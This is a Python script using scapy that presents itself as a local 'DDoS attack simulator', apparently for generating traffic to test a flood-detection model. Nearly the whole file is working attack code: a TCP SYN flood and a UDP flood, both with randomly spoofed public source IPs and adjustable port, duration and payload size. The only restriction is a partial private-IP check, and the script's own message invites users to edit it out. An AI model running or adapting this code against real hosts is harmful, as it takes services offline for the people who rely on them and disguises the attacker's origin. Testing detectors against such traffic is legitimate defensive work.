"""
DDoS Attack Simulator — Local Testing Only
==========================================
Simulates TCP SYN flood and UDP flood attacks against a target IP.

WARNING: Only use this against your own machines on your own network.
         Using this against any external IP is illegal.

Usage:
    sudo python simulate.py --target 192.168.1.100 --attack syn
    sudo python simulate.py --target 192.168.1.100 --attack udp
    sudo python simulate.py --target 192.168.1.100 --attack syn --port 80 --duration 30

Requirements:
    pip install scapy

Notes:
    - Must be run as root to send raw packets
    - Run capture.py on the target machine to verify detection
"""

import argparse
import os
import random
import signal
import sys
import time

# ─────────────────────────────────────────────────────────────────────────────
# HELPERS
# ─────────────────────────────────────────────────────────────────────────────

def random_ip() -> str:
    """Generate a random spoofed source IP (excludes private ranges)."""
    while True:
        ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        # Skip private ranges
        if not (
            ip.startswith("10.")        or
            ip.startswith("192.168.")   or
            ip.startswith("172.16.")    or
            ip.startswith("127.")
        ):
            return ip


def random_port() -> int:
    return random.randint(1024, 65535)


# ─────────────────────────────────────────────────────────────────────────────
# ATTACK TYPES
# ─────────────────────────────────────────────────────────────────────────────

def syn_flood(target_ip: str, target_port: int, duration: int, verbose: bool):
    """
    TCP SYN Flood — sends SYN packets with spoofed source IPs
    and never completes the handshake. This exhausts the target's
    half-open connection table.

    Signature the model looks for:
    - Very high SYN flag count
    - Near-zero ACK count
    - Small, uniform packet sizes
    - Extremely high packet rate
    """
    from scapy.all import IP, TCP, send, conf
    conf.verb = 0  # suppress scapy output

    print(f"[*] Starting TCP SYN flood → {target_ip}:{target_port}")
    print(f"[*] Duration: {duration}s | Spoofed source IPs: yes")
    print(f"[*] Press Ctrl+C to stop early\n")

    sent      = 0
    start     = time.time()
    end       = start + duration

    while time.time() < end:
        src_ip   = random_ip()
        src_port = random_port()

        pkt = (
            IP(src=src_ip, dst=target_ip) /
            TCP(sport=src_port, dport=target_port, flags="S",
                seq=random.randint(0, 2**32 - 1),
                window=random.randint(1024, 65535))
        )
        send(pkt, verbose=False)
        sent += 1

        if verbose and sent % 500 == 0:
            elapsed = time.time() - start
            rate    = sent / elapsed
            print(f"  Sent {sent:,} SYN packets | {rate:.0f} pkt/s")

    elapsed = time.time() - start
    print(f"\n[+] SYN flood complete — {sent:,} packets in {elapsed:.1f}s ({sent/elapsed:.0f} pkt/s)")


def udp_flood(target_ip: str, target_port: int, duration: int, payload_size: int, verbose: bool):
    """
    UDP Flood — blasts high-volume UDP packets with random payloads
    to overwhelm the target's network interface and processing capacity.

    Signature the model looks for:
    - Massive flow bytes/s and packets/s
    - Protocol = UDP (17)
    - Near-zero backward traffic (target can't respond fast enough)
    - Uniform or random packet sizes
    """
    from scapy.all import IP, UDP, Raw, send, conf
    conf.verb = 0

    print(f"[*] Starting UDP flood → {target_ip}:{target_port}")
    print(f"[*] Duration: {duration}s | Payload size: {payload_size} bytes")
    print(f"[*] Press Ctrl+C to stop early\n")

    sent  = 0
    start = time.time()
    end   = start + duration

    while time.time() < end:
        src_ip   = random_ip()
        src_port = random_port()
        payload  = random.randbytes(payload_size)

        pkt = (
            IP(src=src_ip, dst=target_ip) /
            UDP(sport=src_port, dport=target_port) /
            Raw(load=payload)
        )
        send(pkt, verbose=False)
        sent += 1

        if verbose and sent % 500 == 0:
            elapsed = time.time() - start
            rate    = sent / elapsed
            print(f"  Sent {sent:,} UDP packets | {rate:.0f} pkt/s | {rate * payload_size / 1024:.1f} KB/s")

    elapsed = time.time() - start
    print(f"\n[+] UDP flood complete — {sent:,} packets in {elapsed:.1f}s ({sent/elapsed:.0f} pkt/s)")


# ─────────────────────────────────────────────────────────────────────────────
# ENTRY POINT
# ─────────────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="DDoS attack simulator for local testing only"
    )
    parser.add_argument(
        "--target", required=True,
        help="Target IP address (must be a machine you own)"
    )
    parser.add_argument(
        "--attack", required=True, choices=["syn", "udp"],
        help="Attack type: syn (TCP SYN flood) or udp (UDP flood)"
    )
    parser.add_argument(
        "--port", type=int, default=80,
        help="Target port (default: 80)"
    )
    parser.add_argument(
        "--duration", type=int, default=30,
        help="Attack duration in seconds (default: 30)"
    )
    parser.add_argument(
        "--payload-size", type=int, default=512,
        help="UDP payload size in bytes (default: 512, UDP only)"
    )
    parser.add_argument(
        "--verbose", action="store_true",
        help="Print packet rate stats every 500 packets"
    )
    args = parser.parse_args()

    if os.geteuid() != 0:
        print("[!] This script requires root privileges to send raw packets.")
        print("    Run with: sudo python simulate.py --target <ip> --attack <type>")
        raise SystemExit(1)

    # Safety check — block obviously external IPs
    target = args.target
    if not (
        target.startswith("10.")      or
        target.startswith("192.168.") or
        target.startswith("172.16.")  or
        target.startswith("127.")     or
        target == "localhost"
    ):
        print(f"[!] Target {target} does not appear to be a private/local IP.")
        print(f"    This tool is for local testing only.")
        print(f"    If this is your own server, edit the safety check in the script.")
        raise SystemExit(1)

    # Graceful Ctrl+C
    signal.signal(signal.SIGINT, lambda s, f: (print("\n[*] Stopped by user."), sys.exit(0)))

    if args.attack == "syn":
        syn_flood(target, args.port, args.duration, args.verbose)
    elif args.attack == "udp":
        udp_flood(target, args.port, args.duration, args.payload_size, args.verbose)


if __name__ == "__main__":
    main()